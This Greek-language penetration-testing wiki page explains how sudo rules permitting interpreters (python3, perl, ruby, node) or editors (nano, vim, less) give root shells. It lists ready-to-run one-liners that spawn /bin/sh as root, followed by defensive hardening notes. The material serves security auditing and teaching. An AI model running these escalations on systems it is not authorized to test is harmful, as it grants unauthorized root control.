# Κατάχρηση εντολών Sudo

## Interpreters που επιτρέπονται από το Sudo

Αν το `sudo -l` επιτρέπει σε έναν χρήστη να εκτελέσει έναν interpreter ως root, αντιμετωπίστε το ως άμεση εκτέλεση κώδικα. Οι interpreters έχουν σχεδιαστεί για να εκτελούν arbitrary code, επομένως ένας κανόνας που επιτρέπει τα binaries `python3`, `perl`, `ruby`, `lua`, `node` ή παρόμοια συνήθως ισοδυναμεί με εκτέλεση εντολών root, εκτός αν τα arguments είναι αυστηρά περιορισμένα και επικυρωμένα.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)[[9]](#references)[[11]](#references)</sup>

Συνήθης ροή ελέγχου: πρώτα εμφανίστε τα privileges του χρήστη και, στη συνέχεια, εκτελέστε μια εντολή Python με την επιλογή `-c` του interpreter.<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Παρακάτω εμφανίζονται άλλα παραδείγματα interpreters· οι αναφερόμενοι interpreters τεκμηριώνουν την εκτέλεση inline-code ή APIs child-process.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
Η ακριβής διαδρομή έχει σημασία. Αν ο κανόνας sudo επιτρέπει το `/usr/bin/python3`, χρησιμοποιήστε αυτήν ακριβώς τη διαδρομή κατά την επικύρωση.<sup>[[2]](#references)</sup>
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Editors allowed by Sudo

If `sudo -l` επιτρέπει σε έναν χρήστη να εκτελεί έναν interactive editor ως root, αντιμετωπίστε το ως επιφάνεια εκτέλεσης εντολών και όχι ως ακίνδυνη άδεια επεξεργασίας αρχείων. Οι editors συχνά μπορούν να εκτελούν shell commands, να διαβάζουν αυθαίρετα αρχεία, να γράφουν αυθαίρετα αρχεία ή να καλούν external helpers μέσα από τον editor.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

Συνηθισμένη ροή ελέγχου: εμφανίστε τα privileges του χρήστη και, στη συνέχεια, εκτελέστε κάθε επιτρεπόμενο editor ή pager μέσω sudo.<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Εκτέλεση εντολών με το Nano

Όταν το `nano` επιτρέπεται μέσω sudo, η εκτέλεση εντολών μπορεί να είναι προσβάσιμη από το περιβάλλον εργασίας του editor.<sup>[[12]](#references)</sup>
```text
Ctrl+R
Ctrl+X
```
Στη συνέχεια, παρέχετε μια εντολή όπως `id` ή `/bin/sh` στη γραμμή εντολών του nano.<sup>[[12]](#references)</sup>
```bash
id
/bin/sh
```
Εάν ένα interactive shell δεν διαθέτει αξιοποιήσιμα terminal streams, αυτή η μορφή ανακατεύθυνσης αντιστοιχίζει το standard output και το error του στο descriptor 0.<sup>[[15]](#references)</sup>
```bash
reset; /bin/sh 1>&0 2>&0
```
Η ακριβής ακολουθία πλήκτρων μπορεί να διαφέρει ανάλογα με την έκδοση και τις επιλογές build του nano, αλλά το ζήτημα ασφάλειας είναι το ίδιο: ο editor εκτελείται ως root και μπορεί να καλεί εξωτερικές εντολές.<sup>[[1]](#references)[[12]](#references)</sup>

### Άλλες συνηθισμένες διαφυγές από editors

Οι editors τύπου Vim συνήθως παρέχουν εκτέλεση εντολών μέσω του `:!`.<sup>[[13]](#references)</sup>
```text
:!/bin/sh
```
Pagers όπως το `less` μπορούν επίσης να εκθέσουν εκτέλεση shell.<sup>[[14]](#references)</sup>
```text
!/bin/sh
```
## Αμυντικές σημειώσεις

- Αποφύγετε την παραχώρηση interpreters ή interactive editors μέσω sudo.<sup>[[1]](#references)</sup>
- Προτιμήστε fixed wrappers, ιδιοκτησίας του root, που εκτελούν μία μόνο, περιορισμένη administrative ενέργεια.<sup>[[1]](#references)[[2]](#references)</sup>
- Αν ένας interpreter είναι αναπόφευκτος, περιορίστε το ακριβές path του script και αποτρέψτε arguments ελεγχόμενα από τον χρήστη, writable imports, `PYTHONPATH` και μη ασφαλή διατήρηση του environment.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup>
- Αν απαιτείται editing αρχείων, περιορίστε το ακριβές file path και εξετάστε τη χρήση του `sudoedit` με patched εκδόσεις του sudo και αυστηρό χειρισμό του environment.<sup>[[1]](#references)[[2]](#references)</sup>
- Ελέγξτε τα `SETENV`, `env_keep`, writable working directories, writable module/import paths, `NOEXEC`, `use_pty` και το logging, αλλά μην τα θεωρείτε πλήρες sandbox.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [sudo(8) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [2] [sudoers(5) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [3] [Command line and environment — Τεκμηρίωση Python](https://docs.python.org/3/using/cmdline.html)
- [4] [os — Miscellaneous operating system interfaces — Τεκμηρίωση Python](https://docs.python.org/3/library/os.html)
- [5] [perlrun — πώς να εκτελέσετε τον Perl interpreter](https://perldoc.perl.org/perlrun)
- [6] [exec — Τεκμηρίωση Perl](https://perldoc.perl.org/functions/exec)
- [7] [Επιλογές command-line της Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
- [8] [Kernel — Τεκμηρίωση Ruby](https://ruby-doc.org/3.4/Kernel.html)
- [9] [Command-line API — Τεκμηρίωση Node.js](https://nodejs.org/api/cli.html)
- [10] [Child process — Τεκμηρίωση Node.js](https://nodejs.org/api/child_process.html)
- [11] [Σελίδα εγχειριδίου lua της Lua 5.4](https://www.lua.org/manual/5.4/lua.html)
- [12] [Ο text editor GNU nano](https://nano-editor.org/manual.html)
- [13] [Vim: usr_21.txt](https://vimhelp.org/usr_21.txt.html)
- [14] [less(1) — Σελίδα εγχειριδίου Linux](https://man7.org/linux/man-pages/man1/less.1.html)
- [15] [Redirections — Εγχειρίδιο αναφοράς Bash](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
{{#include ../../banners/hacktricks-training.md}}
